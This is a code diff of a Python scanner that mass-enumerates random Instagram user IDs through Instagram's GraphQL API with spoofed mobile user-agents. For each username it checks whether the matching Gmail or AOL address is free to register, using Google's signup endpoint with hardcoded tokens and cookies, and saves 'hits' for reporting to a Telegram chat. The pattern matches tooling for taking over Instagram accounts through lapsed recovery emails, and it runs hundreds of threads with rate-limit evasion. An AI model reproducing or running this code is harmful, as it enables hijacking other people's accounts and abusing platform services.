-                f"&f.req=%5B%22TL%3A{tl}%22%2C%22{usr}%22%2C0%2C0%2C1%2Cnull%2C0%2C5167%5D"
-                "&azt=AFoagUUtRlvV928oS9O7F6eeI4dCO2r1ig%3A1712322460888&cookiesDisabled=false"
-                "&deviceinfo=%5Bnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%22NL%22%2Cnull%2Cnull%2Cnull%2C%22GlifWebSignIn%22"
-                "%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2Cnull%2C2%2Cnull%2C0%2C1%2C%22%22%2Cnull%2Cnull%2C2%2C2%5D"
-                "&gmscoreversion=undefined&flowName=GlifWebSignIn&"
-            )
-            resp = loc_session.post(
-                f"{_M1_CONFIG['google_url']}/_/signup/usernameavailability",
-                params=params, cookies=cookies, headers=headers, data=data, timeout=8
-            )
-            if '"gf.uar",1' in resp.text:
-                _m1_save_hit(usr, user, token, chat_id)
-                return
-        except Exception:
-            pass
-        # Method 2: google.txt TL
-        try:
-            with open("google.txt", "r") as ys:
-                tl2 = ys.read().strip()
-            url2    = "https://accounts.google.com/_/signup/usernameavailability"
-            params2 = {'hl': "en-GB", 'TL': tl2, '_reqid': "446000", 'rt': "j"}
-            data2   = {
-                'continue': "https://accounts.google.com/ManageAccount?nc=1",
-                'f.req': "[\"TL:"+ tl2 +"\",\""+ usr +"\",0,0,1,null,1,2464]",
-                'azt': "AFoagUUWePV-jOFGpL5c7eI9kfCfGnCl5w:1776669382039",
-                'cookiesDisabled': "false",
-                'deviceinfo': "[null,null,null,null,null,\"IN\",null,null,null,\"GlifWebSignIn\",null,[],null,null,null,null,1,null,0,1,\"\",null,null,2,2,2]",
-                'gmscoreversion': "null", 'flowName': "GlifWebSignIn",
-                'checkConnection': "youtube:301", 'checkedDomains': "youtube",
-                'pstMsg': "1", '': ""
-            }
-            hdrs2 = {
-                'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
-                'x-same-domain': "1", 'google-accounts-xsrf': "1",
-                'sec-ch-ua-mobile': "?1",
-                'origin': "https://accounts.google.com",
-                'sec-fetch-site': "same-origin", 'sec-fetch-mode': "cors",
-                'sec-fetch-dest': "empty",
-                'referer': "https://accounts.google.com/signup/v2/createusername?flowName=GlifWebSignIn&flowEntry=ServiceLogin&TL=" + tl2,
-                'accept-language': "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7",
-                'Cookie': "__Host-GAPS=1:6oR-TWX06t3JKSEu3DqYRT_IWnQLlw:Rc9Z7lHTPNW6qMCN"
-            }
-            resp2 = _m1__session.post(url2, params=params2, data=data2, headers=hdrs2, timeout=8)
-            if '"gf.uar",1' in resp2.text:
-                _m1_save_hit(usr, user, token, chat_id)
-                return
-            else:
-                _m1_taken += 1
-        except Exception:
-            _m1_taken += 1
-        _m1_bad_email += 1
-    except Exception:
-        _m1_bad_email += 1
 
-def _m1_cinstagram(email, token, chat_id, user, loc_session):
-    global _m1_good_insta, _m1_bad_insta
-    if _m1_lookup_instagram(email):
-        _m1_good_insta += 1
-        _m1_cgmail(email, token, chat_id, user, loc_session)
-    else:
-        _m1_bad_insta += 1
+# ── Core scanner ──
 
 _m1_lookup_pool: ThreadPoolExecutor = None
 
+def _m1_cinstagram(username, user, token, chat_id, loc_session):
+    global _m1_good_insta, _m1_bad_insta
+    email_gmail = username + "@gmail.com"
+    if _m1_lookup_instagram(email_gmail):
+        _m1_good_insta += 1
+        t_gmail = Thread(target=_m1_cgmail, args=(username, user, token, chat_id, requests.Session()), daemon=True)
+        t_aol   = Thread(target=_m1_caol,   args=(username, user, token, chat_id, requests.Session()), daemon=True)
+        t_gmail.start()
+        t_aol.start()
+        t_gmail.join()
+        t_aol.join()
+    else:
+        _m1_bad_insta += 1
+
 def _m1_sinsta(min_id, max_id, token, chat_id, min_followers=0, stop_event=None):
-    loc_session = _register_session(requests.Session())
+    local_session = _register_session(requests.Session())
     _BRANDS = ["SAMSUNG","HUAWEI","LGE/lge","HTC","ASUS","ZTE","ONEPLUS","XIAOMI","OPPO","VIVO","SONY","REALME"]
     _VERS   = ["23/6.0","24/7.0","25/7.1.1","26/8.0","27/8.1","28/9.0"]
-    _CHARS  = 'azertyuiopmlkjhgfdsqwxcvbnAZERTYUIOPMLKJHGFDSQWXCVBN1234567890'
+    _CHARS  = "azertyuiopmlkjhgfdsqwxcvbnAZERTYUIOPMLKJHGFDSQWXCVBN1234567890"
     while not (stop_event and stop_event.is_set()):
         try:
             user_id    = random.randrange(min_id, max_id)
@@ -1094,56 +1024,62 @@ def _m1_sinsta(min_id, max_id, token, chat_id, min_followers=0, stop_event=None)
                 + random.choice(_BRANDS)
                 + "; SM-T" + rnd + "; SM-T" + rnd + "; qcom; en_US; 545986" + str(random.randint(111, 999)) + ")"
             )
-            lsd = ''.join(random.choices(_CHARS, k=16))
+            lsd = "".join(random.choices(_CHARS, k=16))
             headers = {
-                'accept': '*/*', 'accept-language': 'en,en-US;q=0.9',
-                'content-type': 'application/x-www-form-urlencoded',
-                'dnt': '1', 'origin': 'https://www.instagram.com',
-                'priority': 'u=1, i',
-                'referer': 'https://www.instagram.com/cristiano/following/',
-                'user-agent': user_agent,
-                'x-fb-friendly-name': 'PolarisUserHoverCardContentV2Query',
-                'x-fb-lsd': lsd,
+                "accept": "*/*",
+                "accept-language": "en,en-US;q=0.9",
+                "content-type": "application/x-www-form-urlencoded",
+                "dnt": "1",
+                "origin": "https://www.instagram.com",
+                "priority": "u=1, i",
+                "referer": "https://www.instagram.com/cristiano/following/",
+                "user-agent": user_agent,
+                "x-fb-friendly-name": "PolarisProfilePageContentQuery",
+                "x-fb-lsd": lsd,
             }
             data = {
-                'lsd': lsd,
-                'fb_api_caller_class': 'RelayModern',
-                'fb_api_req_friendly_name': 'PolarisUserHoverCardContentV2Query',
-                'variables': '{"userID":"' + str(user_id) + '","username":"cristiano"}',
-                'server_timestamps': 'true',
-                'doc_id': '7717269488336001',
+                "lsd": lsd,
+                "fb_api_caller_class": "RelayModern",
+                "fb_api_req_friendly_name": "PolarisProfilePageContentQuery",
+                "variables": (
+                    '{"enable_integrity_filters":true,"id":"' + str(user_id) +
+                    '","__relay_internal__pv__PolarisCannesGuardianExperienceEnabledrelayprovider":true,'
+                    '"__relay_internal__pv__PolarisCASB976ProfileEnabledrelayprovider":false,'
+                    '"__relay_internal__pv__PolarisWebSchoolsEnabledrelayprovider":false,'
+                    '"__relay_internal__pv__PolarisRepostsConsumptionEnabledrelayprovider":false}'
+                ),
+                "server_timestamps": "true",
+                "doc_id": "26672929172408668",
             }
             global _m1_scanned
             _m1_scanned += 1
-            _web_state['scanned'] = _m1_scanned
+            _web_state["scanned"] = _m1_scanned
+
             if stop_event and stop_event.is_set():
                 break
-            resp = loc_session.post(_M1_CONFIG["insta_graphql"], headers=headers, data=data, timeout=2)
+
+            resp = local_session.post(_M1_INSTA_GRAPHQL, headers=headers, data=data, timeout=2)
             if resp.status_code == 429:
                 time.sleep(0.1)
                 continue
             if resp.status_code != 200:
                 continue
-            user = resp.json().get('data', {}).get('user')
-            if user and user.get('username'):
-                followers = user.get('follower_count', 0)
-                uid       = user.get('pk', 0)
-                user_year = gdate(uid)
-                if _M1_VIP_CONFIG["vip_date_min"] and user_year < _M1_VIP_CONFIG["vip_date_min"]:
-                    continue
-                if _M1_VIP_CONFIG["vip_date_max"] and user_year > _M1_VIP_CONFIG["vip_date_max"]:
-                    continue
+
+            user = resp.json().get("data", {}).get("user")
+            if user and user.get("username"):
+                followers = user.get("follower_count", 0)
                 if min_followers > 0 and followers < min_followers:
                     continue
-                # Offload the slow email pipeline to a dedicated pool so this
-                # scanner thread is free to pick the next ID immediately.
-                email = user['username'] + _M1_CONFIG["domain"]
+                username = user["username"]
                 lp = _m1_lookup_pool
                 if lp is not None:
-                    lp.submit(_m1_cinstagram, email, token, chat_id, user, requests.Session())
+                    lp.submit(_m1_cinstagram, username, user, token, chat_id, requests.Session())
                 else:
-                    _m1_cinstagram(email, token, chat_id, user, loc_session)
+                    _m1_cinstagram(username, user, token, chat_id, local_session)
+
+            time.sleep(0.08)
         except Exception:
+            time.sleep(0.2)
             continue
 
 
@@ -1155,44 +1091,36 @@ def run_method1_web(token, chat_id, year_choice, min_followers, stop_event):
     global _m1_hits, _m1_bad_insta, _m1_bad_email, _m1_good_insta
     global _m1_total, _m1_taken, _m1_limit, _m1_found_emails, _m1_scanned
 
-    # Reset all counters
     _m1_hits = _m1_bad_insta = _m1_bad_email = _m1_good_insta = 0
     _m1_total = _m1_taken = _m1_limit = _m1_scanned = 0
     _m1_found_emails = []
 
     _write_session_separator(1)
     _web_state.update({
-        'running': True, 'method': '1',
-        'hits': 0, 'good': 0, 'bad_insta': 0, 'bad_email': 0,
-        'taken': 0, 'limit': 0, 'total': 0, 'verified': 0,
-        'recent_hits': [], 'tg_status': '', 'tg_error': '',
+        "running": True, "method": "1",
+        "hits": 0, "good": 0, "bad_insta": 0, "bad_email": 0,
+        "taken": 0, "limit": 0, "total": 0, "verified": 0,
+        "recent_hits": [], "tg_status": "", "tg_error": "",
     })
 
     if year_choice is not None:
-        _M1_VIP_CONFIG["vip_date_min"] = year_choice
-        _M1_VIP_CONFIG["vip_date_max"] = year_choice
+        min_id, max_id = get_year_range(year_choice)
     else:
-        _M1_VIP_CONFIG["vip_date_min"] = 2010
-        _M1_VIP_CONFIG["vip_date_max"] = 2019
+        min_id, max_id = 1, 78313496938
 
-    min_id, max_id = get_year_range(year_choice)
-
-    # Start background helpers
     _m1_next_about_session()
     _m1_about_refresh_tokens(_m1_ABOUT_COOKIE_STR)
     Thread(target=_m1_about_token_refresher, daemon=True).start()
-    Thread(target=_m1_get_tl_background,     daemon=True).start()
     Thread(target=_m1_gtokens_background,    daemon=True).start()
 
-    # Initial token fetch
     _m1_gtokens()
 
     NUM_SCANNERS = 500
-    NUM_LOOKUP   = 100
+    NUM_LOOKUP   = 300
     global _m1_pool, _m1_lookup_pool
     try:
-        lookup_pool  = ThreadPoolExecutor(max_workers=NUM_LOOKUP)
-        scanner_pool = ThreadPoolExecutor(max_workers=NUM_SCANNERS)
+        lookup_pool     = ThreadPoolExecutor(max_workers=NUM_LOOKUP)
+        scanner_pool    = ThreadPoolExecutor(max_workers=NUM_SCANNERS)
         _m1_lookup_pool = lookup_pool
         _m1_pool        = scanner_pool
         futures = [
@@ -1207,7 +1135,8 @@ def run_method1_web(token, chat_id, year_choice, min_followers, stop_event):
     finally:
         _m1_pool        = None
         _m1_lookup_pool = None
-        _web_state['running'] = False
+        _web_state["running"] = False
+
 
 
 # ══════════════════════════════════════════════════════════════════════════════
